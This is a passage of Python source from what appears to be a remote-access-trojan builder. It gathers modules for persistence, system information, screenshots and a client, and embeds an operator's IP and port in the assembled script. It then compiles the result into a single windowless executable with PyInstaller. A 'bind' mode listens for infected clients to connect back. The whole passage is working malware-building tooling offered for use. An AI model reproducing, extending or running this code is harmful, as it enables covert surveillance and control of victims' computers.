        fl.close()
        return data

    def get_consts(self):
        data = 'CONSTIP = \"%s\"\nCONSTPT = %i' % (self.address, self.port)
        return data

    def get_persistence(self):
        topen = os.path.join(self.pather, 'persistence.py')
        fl = open(topen)
        data = fl.read()
        fl.close()
        return data

    def get_sysinfo(self):
        topen = os.path.join(self.pather, 'sysinfo.py')
        fl = open(topen)
        data = fl.read()
        fl.close()
        return data

    def get_screenshot(self):
        topen = os.path.join(self.pather, 'screenshot.py')
        fl = open(topen)
        data = fl.read()
        fl.close()
        return data

    def get_client(self):
        topen = os.path.join(self.pather, 'client.py')
        fl = open(topen)
        data = fl.read()
        fl.close()
        return data

    def get_main(self):
        topen = os.path.join(self.pather, 'main.py')
        fl = open(topen)
        data = fl.read()
        fl.close()
        return data

    def tmp_dir(self):
        dirname = os.path.dirname(__file__)
        dirname = os.path.join(dirname, 'tmp')
        if not os.path.isdir(dirname):
            os.mkdir(dirname)
        fname = os.path.join(dirname, 'cl.py')
        return (dirname, fname, 'cl.py')

    def patch(self):
        time.sleep(2)
        pull.function('Compiling modules ... ')
        self.data = self.v_imports + '\n\n' + self.v_consts + '\n' + self.v_persistence + '\n' + self.v_sysinfo + '\n\n' + self.v_screenshot + '\n\n' + self.v_client + '\n\n' + self.v_main
        time.sleep(2)
        pull.function('Generating source code ...')
        fl = open(self.output, 'w')
        fl.write(self.data)
        fl.close()
        time.sleep(2)
        pull.print('Code generated successfully!')
        pull.print('File: ' + self.output)

    def generate(self):
        time.sleep(2)
        pull.function('Compiling modules ... ')
        self.data = self.v_imports + '\n\n' + self.v_consts + '\n\n' + self.v_persistence + '\n\n' + self.v_sysinfo + '\n\n' + self.v_screenshot + '\n\n' + self.v_client + '\n\n' + self.v_main
        time.sleep(2)
        pull.function('Generating one time code for binary ')
        self.flname = self.tmp_dir()
        fl = open(self.flname[1], 'w')
        fl.write(self.data)
        fl.close()
        pull.print('Code generated successfully!')

    def compile(self):
        pull.function('Compiling generated code /\\')
        counter = 1
        t = threading.Thread(target=PyInstaller.__main__.run, args=(['--name=%s' % os.path.basename(self.output), '--onefile', '--windowed', '--log-level=ERROR', '--distpath=%s' % os.path.dirname(self.output), '--workpath=%s' % self.flname[0], os.path.join(self.flname[0], self.flname[2])],))
        t.daemon = True
        t.start()
        if t.is_alive():
            sys.stdout.write('\r' + pull.BLUE + '[' + pull.UNDERLINE + ':' + pull.END + pull.BLUE + '] ' + pull.END + 'Elapsed Time: %is' % counter + pull.END)
            time.sleep(1)
            counter += 1
        sys.stdout.write('\n')
        pull.print('Compiled Successfully!')

    def clean(self):
        pull.function('Cleaning files and temporary codes')
        shutil.rmtree(self.flname[0])
        pull.print('File: ' + self.output)

class PARSER:
    COMMANDS = ['bind', 'generate']

    def __init__(self, prs):
        self.mode = self.v_mode(prs.mode, prs.help)
        self.help = self.v_help(prs.help)
        if self.mode == 'bind':
            self.address = self.v_address(prs.address)
            self.port = self.v_port(prs.port)

    def v_help(self, hl):
        if hl:
            if not self.mode:
                pull.help_overall()

    def v_address(self, str):
        return str

    def v_port(self, port):
        if not port:
            pull.exit('You need to Supply a Valid Port Number')
        if port <= 0 or port > 65535:
            pull.exit('Invalid Port Number')
        return port

    def v_mode(self, val, hl):
        if val:
            if val in self.COMMANDS:
                return val

    def v_output(self, val):
        if val:
            if os.path.isdir(os.path.dirname(val)):
                return val

def main():
    pull.logo()
    parser = argparse.ArgumentParser(add_help=False)
    parser.add_argument('mode', nargs='?', help='Moder')
    parser.add_argument('-h', '--help', dest='help', default=False, action='store_true', help='Help Manual')
    parser.add_argument('-a', '--address', dest='address', default='', type=str, help='Address to Bind to')
    parser.add_argument('-p', '--port', dest='port', default=0, type=int, help='Port to Bind to')
    parser.add_argument('-o', '--output', dest='output', default='', type=str, help='Complete Path to Output File!')
    parser.add_argument('-s', '--source', dest='source', default=False, action='store_true', help='Source file')
    parser.add_argument('--persistence', dest='persistence', default=False, action='store_true', help='Persistence')
    parser = parser.parse_args()
    parser = PARSER(parser)
    if parser.mode == 'bind':
        iface = INTERFACE(parser)
        iface.bind()
        iface.accept()
        iface.launch()
        iface.close()